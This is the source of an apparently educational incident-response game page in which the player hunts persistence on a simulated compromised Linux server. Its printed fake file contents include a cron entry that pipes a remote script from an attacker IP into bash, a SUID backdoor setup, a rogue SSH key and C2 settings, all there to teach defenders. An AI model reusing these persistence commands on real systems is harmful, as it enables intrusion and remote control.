<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script src="../../components/AccessGuard.js"></script>
    <script>AccessGuard.require('sorted');</script>
    <script src="../../components/AchievementManager.js"></script>
    <script src="../../components/ModuleProgress.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LINUX-FS-02: Root Hunt | Operator</title>
    <link rel="stylesheet" href="../engine/operator.css">
    <style>
        .editor-panel { display: none !important; }
        .term-panel { flex:0 0 45%; display:flex; flex-direction:column; background:#080a0e; height:100%; }
        .term-bar { display:flex; align-items:center; gap:6px; padding:8px 14px; background:#0e1018; border-bottom:1px solid rgba(57,255,20,0.1); }
        .term-dot { width:8px; height:8px; border-radius:50%; background:rgba(57,255,20,0.3); }
        .term-bar-label { font-size:0.55rem; letter-spacing:0.12em; color:rgba(57,255,20,0.25); margin-left:6px; }
        .term-output { flex:1; overflow-y:auto; padding:10px 14px; font-size:0.72rem; line-height:1.55; }
        .term-output::-webkit-scrollbar { width:4px; }
        .term-output::-webkit-scrollbar-thumb { background:rgba(57,255,20,0.15); border-radius:2px; }
        .term-input-row { display:flex; align-items:center; gap:8px; padding:8px 14px; border-top:1px solid rgba(57,255,20,0.1); }
        .term-prompt-text { color:rgba(57,255,20,0.5); font-size:0.72rem; letter-spacing:0.04em; white-space:nowrap; }
        .term-input { flex:1; background:transparent; border:none; outline:none; color:#76ff03; font-family:'Courier New',monospace; font-size:0.72rem; caret-color:#39ff14; }
        .term-line { word-break:break-word; }
        .term-system { color:rgba(57,255,20,0.3); } .term-info { color:rgba(57,255,20,0.65); }
        .term-success { color:#39ff14; font-weight:600; } .term-error { color:#ff4444; }
        .term-warning { color:#ffaa00; } .term-node-info { color:#00ccff; }
        .term-heading { color:#39ff14; font-weight:700; } .term-prompt-echo { color:rgba(57,255,20,0.4); }
        @media (max-width:768px) { .term-panel { flex:1; } }
    </style>
</head>
<body>
    <div id="operator-root"></div>
    <script src="../engine/OperatorEngine.js"></script>
    <script src="../engine/AgentBridge.js"></script>
    <script src="../configs/linux-fs-02.config.js"></script>
    <script>
    (function() {
        var CONFIG = LINUX_FS_02_CONFIG;
        var engine = OperatorEngine.init(CONFIG);
        var state  = engine.getState();

        // Custom state fields for this mission
        if (typeof state.maliciousCronFound === 'undefined') state.maliciousCronFound = false;
        if (typeof state.attackerIPFound === 'undefined')    state.attackerIPFound = false;
        if (typeof state.sshKeyRemoved === 'undefined')      state.sshKeyRemoved = false;
        if (typeof state.suidBackdoorFound === 'undefined')  state.suidBackdoorFound = false;
        state.commandHistory = state.commandHistory || [];
        state.historyIndex   = -1;

        // Inject terminal panel
        var editorPanel = document.querySelector('.editor-panel');
        if (editorPanel) editorPanel.style.display = 'none';
        var layout = document.querySelector('.mission-layout');
        var termPanel = document.createElement('div');
        termPanel.className = 'term-panel';
        termPanel.innerHTML =
            '<div class="term-bar"><div class="term-dot"></div><div class="term-dot"></div><div class="term-dot"></div><span class="term-bar-label">OPERATOR TERMINAL</span></div>' +
            '<div class="term-output" id="term-output"></div>' +
            '<div class="term-input-row"><span class="term-prompt-text">' + CONFIG.prompt + '</span><input type="text" class="term-input" id="term-input" autocomplete="off" spellcheck="false" autofocus></div>';
        layout.appendChild(termPanel);

        var termOutput = document.getElementById('term-output');
        var termInput  = document.getElementById('term-input');

        function printLine(t, type) {
            var l = document.createElement('div');
            l.className = 'term-line term-' + (type||'system');
            l.textContent = t;
            termOutput.appendChild(l);
            while (termOutput.children.length > 200) termOutput.removeChild(termOutput.firstChild);
            termOutput.scrollTop = termOutput.scrollHeight;
        }

        function currentNodeType() { return CONFIG.grid.cells[state.position.row][state.position.col]; }

        // --- Commands: context-sensitive ls, cat, find, grep, crontab, remove ---
        function cmdHelp() {
            printLine('', 'system');
            printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
            printLine('  scan              Survey area', 'info');
            printLine('  move <dir>        Move analyst (n/s/e/w)', 'info');
            printLine('  ls                List directory contents', 'info');
            printLine('  cat <file>        Read a file', 'info');
            printLine('  find              Find SUID binaries (in /USR/SBIN)', 'info');
            printLine('  grep <pattern>    Search logs (in /VAR/LOG)', 'info');
            printLine('  crontab <flag>    Manage cron (in /ETC/CRON.D)', 'info');
            printLine('  remove <target>   Remove persistence (in /ETC/SSH)', 'info');
            printLine('  status / help / clear', 'info');
        }

        function cmdScan() {
            var col=state.position.col, row=state.position.row, cellType=currentNodeType();
            printLine('Scanning filesystem...','system'); printLine('','system');
            if (cellType!=='empty'&&cellType!=='wall') { var c=CONFIG.nodes[cellType]; printLine('Current: '+c.label+' on '+c.ip,'heading'); printLine(c.desc,'info'); }
            else printLine('Current: Filesystem path (no notable directory)','heading');
            printLine('','system'); printLine('Adjacent:','heading');
            var dirs=[{name:'North',dc:0,dr:-1},{name:'South',dc:0,dr:1},{name:'East',dc:1,dr:0},{name:'West',dc:-1,dr:0}];
            for (var i=0;i<dirs.length;i++) {
                var d=dirs[i],nc=col+d.dc,nr=row+d.dr;
                if (nc<0||nc>=CONFIG.grid.cols||nr<0||nr>=CONFIG.grid.rows) { printLine('  '+d.name+': [filesystem boundary]','system'); continue; }
                var type=CONFIG.grid.cells[nr][nc];
                if (type==='wall') { printLine('  '+d.name+': [no path]','system'); continue; }
                var key=nc+','+nr; if (!state.visibility[key]||state.visibility[key]==='hidden') state.visibility[key]='revealed';
                if (type==='empty') printLine('  '+d.name+': Filesystem path','info');
                else { var info=CONFIG.nodes[type]; printLine('  '+d.name+': '+info.label+' on '+info.ip,'node-info'); }
            }
            engine.updateGrid(); engine.saveState();
        }

        function cmdMove(args) {
            if (!args.length) { printLine('Usage: move <direction>','error'); return; }
            var dirMap={'north':[0,-1],'n':[0,-1],'south':[0,1],'s':[0,1],'east':[1,0],'e':[1,0],'west':[-1,0],'w':[-1,0]};
            var dir=args[0].toLowerCase(); if (!dirMap[dir]) { printLine('Unknown direction.','error'); return; }
            var d=dirMap[dir], nc=state.position.col+d[0], nr=state.position.row+d[1];
            if (nc<0||nc>=CONFIG.grid.cols||nr<0||nr>=CONFIG.grid.rows) { printLine('No path beyond filesystem boundary.','error'); return; }
            var cellType=CONFIG.grid.cells[nr][nc]; if (cellType==='wall') { printLine('No traversable path.','error'); return; }
            state.position={col:nc,row:nr}; state.visibility[nc+','+nr]='visited';
            if (cellType!=='empty') state.nodesDiscovered.add(cellType);
            engine.revealAdjacent(nc,nr);
            var dirFull={n:'north',s:'south',e:'east',w:'west'}, dirName=dirFull[dir]||dir;
            if (cellType==='empty') printLine('cd '+dirName+'... filesystem path.','system');
            else { var info=CONFIG.nodes[cellType]; printLine('cd '+info.label,'success'); printLine(info.desc,'info'); }
            engine.checkObjectives(); engine.updateGrid(); engine.saveState();
        }

        // Context-sensitive ls
        function cmdLs() {
            var node = currentNodeType();
            printLine('','system');
            if (node==='etc-cron') { printLine('total 24','system'); printLine('drwxr-xr-x  root root  cron.daily/','info'); printLine('drwxr-xr-x  root root  cron.hourly/','info'); printLine('-rw-r--r--  root root  system-update','info'); printLine('-rw-r--r--  root root  logrotate','info'); printLine('-rw-r--r--  root root  .data-sync      <- [SUSPICIOUS]','warning'); printLine('','system'); printLine('Hint: cat .data-sync to inspect.','system'); }
            else if (node==='var-log') { printLine('total 1.2G','system'); printLine('-rw-r--r--  root root  auth.log','info'); printLine('-rw-r--r--  root root  syslog','info'); printLine('-rw-r--r--  root root  kern.log','info'); printLine('','system'); printLine('Hint: cat auth.log or grep <pattern>','system'); }
            else if (node==='home-admin') { printLine('total 48','system'); printLine('-rw-r--r--  admin admin  .bashrc','info'); printLine('-rw-r--r--  admin admin  .bash_history','info'); printLine('drwx------  admin admin  .ssh/','info'); printLine('','system'); printLine('Hint: cat .bash_history','system'); }
            else if (node==='ssh-config') { printLine('total 16','system'); printLine('-rw-r--r--  root root  sshd_config','info'); printLine('-rw-r--r--  root root  authorized_keys','info'); printLine('','system'); printLine('Hint: cat authorized_keys','system'); }
            else if (node==='tmp-hidden') { printLine('total 3','system'); printLine('-rwxr-xr-x  root root  .payload.elf','warning'); printLine('-rw-r--r--  root root  .config.dat','warning'); printLine('-rw-r--r--  root root  .pid','warning'); printLine('','system'); printLine('[!] All hidden (dot-prefixed). Attacker staging area.','warning'); }
            else if (node==='usr-sbin') { printLine('total 280','system'); printLine('-rwsr-xr-x  root root  adduser','info'); printLine('-rwsr-xr-x  root root  passwd','info'); printLine('-rwsr-xr-x  root root  sudo','info'); printLine('-rwsr-xr-x  root root  update-helper   <- [SUSPICIOUS]','warning'); printLine('','system'); printLine('[!] update-helper has SUID bit. Not standard.','warning'); }
            else if (node==='proc-list') { printLine('PID    USER      COMMAND','heading'); printLine('1      root      /sbin/init','info'); printLine('412    root      /usr/sbin/sshd -D','info'); printLine('1337   root      /tmp/.cache/.payload.elf --daemon  <- [SUSPICIOUS]','warning'); printLine('2201   root      update-helper --interval 300       <- [SUSPICIOUS]','warning'); }
            else if (node==='root-dir') { printLine('total 32','system'); printLine('-rw-r--r--  root root  .bashrc','info'); printLine('-rw-r--r--  root root  .bash_history','info'); printLine('-rw-r--r--  root root  notes.txt','info'); printLine('drwxr-xr-x  root root  scripts/','info'); }
            else printLine('ls: not at a named directory.','error');
        }

        // Context-sensitive cat
        function cmdCat(args) {
            if (!args.length) { printLine('Usage: cat <filename>','error'); return; }
            var file=args.join(' ').toLowerCase(), node=currentNodeType();
            printLine('','system');
            if (node==='etc-cron'&&(file==='.data-sync'||file==='data-sync')) {
                printLine('cat /etc/cron.d/.data-sync','heading'); printLine('*/5 * * * * root curl -s http://185.203.xx.xx/c | bash','warning');
                printLine('[!] MALICIOUS: Downloads remote script every 5 minutes.','warning');
                if (!state.maliciousCronFound) { state.maliciousCronFound=true; engine.checkObjectives(); }
            } else if (node==='var-log'&&file==='auth.log') {
                printLine('cat /var/log/auth.log (tail -30)','heading');
                printLine('Mar 04 03:14:20 srv-web01 sshd: Accepted publickey for admin from 185.203.xx.xx port 51234','warning');
                printLine('Mar 04 03:15:01 srv-web01 sudo: admin : COMMAND=/usr/sbin/useradd backdoor','warning');
                printLine('[!] Attacker IP identified: 185.203.xx.xx','success');
                if (!state.attackerIPFound) { state.attackerIPFound=true; engine.checkObjectives(); }
            } else if (node==='ssh-config'&&file==='authorized_keys') {
                printLine('cat /etc/ssh/authorized_keys','heading');
                printLine('ssh-rsa AAAAB3...8kL admin@workstation','info');
                printLine('ssh-rsa AAAAB3...2Rx backdoor@185.203.xx.xx  <- [SUSPICIOUS]','warning');
                printLine('[!] ROGUE KEY DETECTED. Use "remove backdoor" to purge.','warning');
            } else if (node==='home-admin'&&file==='.bash_history') {
                printLine('cat /home/admin/.bash_history','heading');
                printLine('sudo /bin/bash','warning'); printLine('cp /tmp/.cache/.payload.elf /usr/sbin/update-helper','warning');
                printLine('chmod u+s /usr/sbin/update-helper','warning');
            } else if (node==='tmp-hidden'&&file==='.config.dat') {
                printLine('cat /tmp/.cache/.config.dat','heading'); printLine('c2_host=185.203.xx.xx','warning'); printLine('c2_port=4444','warning');
            } else if (node==='root-dir'&&file==='notes.txt') {
                printLine('cat /root/notes.txt','heading'); printLine('  [ ] Review authorized_keys','info'); printLine('  [ ] Audit cron jobs','info'); printLine('  [ ] Check SUID binaries','info');
            } else if (node==='root-dir'&&file==='.bash_history') {
                printLine('cat /root/.bash_history','heading'); printLine('cp /tmp/p.elf /tmp/.cache/.payload.elf','warning'); printLine('chmod u+s /usr/sbin/update-helper','warning');
            } else { printLine('cat: file not found or permission denied.','error'); }
            engine.saveState();
        }

        function cmdFind() {
            var node=currentNodeType(); printLine('','system');
            if (node==='usr-sbin') {
                printLine('find /usr/sbin -perm /4000 -type f','heading');
                printLine('-rwsr-xr-x  root  /usr/sbin/update-helper    <- [SUSPICIOUS]','warning');
                printLine('[!] Backdoored SUID binary identified.','warning');
                if (!state.suidBackdoorFound) { state.suidBackdoorFound=true; engine.checkObjectives(); }
            } else { printLine('find: most effective in /USR/SBIN.','system'); }
        }

        function cmdRemove(args) {
            if (!args.length) { printLine('Usage: remove <target>','error'); return; }
            var node=currentNodeType();
            if (node==='ssh-config'&&args[0].toLowerCase()==='backdoor') {
                printLine('Removing backdoor key from authorized_keys...','system');
                printLine('[+] SSH key for backdoor@185.203.xx.xx removed.','success');
                if (!state.sshKeyRemoved) { state.sshKeyRemoved=true; engine.checkObjectives(); }
            } else { printLine('remove: target not found or wrong directory.','error'); }
            engine.saveState();
        }

        function cmdGrep(args) {
            if (!args.length) { printLine('Usage: grep <pattern>','error'); return; }
            var node=currentNodeType();
            if (node==='var-log') {
                var pattern=args.join(' ').toLowerCase();
                printLine('grep "'+pattern+'" /var/log/*','heading');
                if (pattern.indexOf('185')!==-1||pattern.indexOf('fail')!==-1) {
                    printLine('auth.log: Failed password for root from 185.203.xx.xx','warning');
                    printLine('syslog: cron: curl -s http://185.203.xx.xx/c | bash','warning');
                } else printLine('No matches.','system');
            } else printLine('grep: most effective in /VAR/LOG.','system');
        }

        function cmdStatus() {
            printLine('','system'); printLine('[STATUS] Position: '+currentNodeType(),'info');
            printLine('[STATUS] Dirs: '+state.nodesDiscovered.size,'info');
            var done=0; for (var i=0;i<state.objectives.length;i++) if(state.objectives[i]) done++;
            printLine('[STATUS] Objectives: '+done+'/'+CONFIG.objectives.length,'info');
        }

        function dispatch(raw) {
            state.commandCount = (state.commandCount||0)+1;
            var parts=raw.trim().split(/\s+/), cmd=parts[0].toLowerCase(), args=parts.slice(1);
            printLine(CONFIG.prompt+' '+raw, 'prompt-echo');
            switch(cmd) {
                case 'help': cmdHelp(); break;
                case 'scan': cmdScan(); break;
                case 'move': case 'cd': cmdMove(args); break;
                case 'ls': cmdLs(); break;
                case 'cat': cmdCat(args); break;
                case 'find': cmdFind(); break;
                case 'grep': cmdGrep(args); break;
                case 'crontab': printLine('Navigate to /ETC/CRON.D and use "cat .data-sync".','system'); break;
                case 'remove': cmdRemove(args); break;
                case 'status': cmdStatus(); break;
                case 'clear': termOutput.innerHTML=''; break;
                default: printLine('Unknown command: '+cmd+'. Type "help".','error');
            }
        }

        termInput.addEventListener('keydown', function(e) {
            if (e.key==='Enter') { var v=termInput.value.trim(); if(!v)return; state.commandHistory.push(v); state.historyIndex=state.commandHistory.length; termInput.value=''; dispatch(v); }
            else if (e.key==='ArrowUp') { e.preventDefault(); if(state.historyIndex>0){state.historyIndex--;termInput.value=state.commandHistory[state.historyIndex];} }
            else if (e.key==='ArrowDown') { e.preventDefault(); if(state.historyIndex<state.commandHistory.length-1){state.historyIndex++;termInput.value=state.commandHistory[state.historyIndex];}else{state.historyIndex=state.commandHistory.length;termInput.value='';} }
        });

        printLine('OPERATOR // LINUX-FS-02: ROOT HUNT','heading');
        printLine('Compromised server. Find and remove persistence mechanisms.','system');
        printLine('Type "help" for commands, "scan" to survey.','system');
        printLine('','system');
        termInput.focus();
    })();
    </script>
</body>
</html>
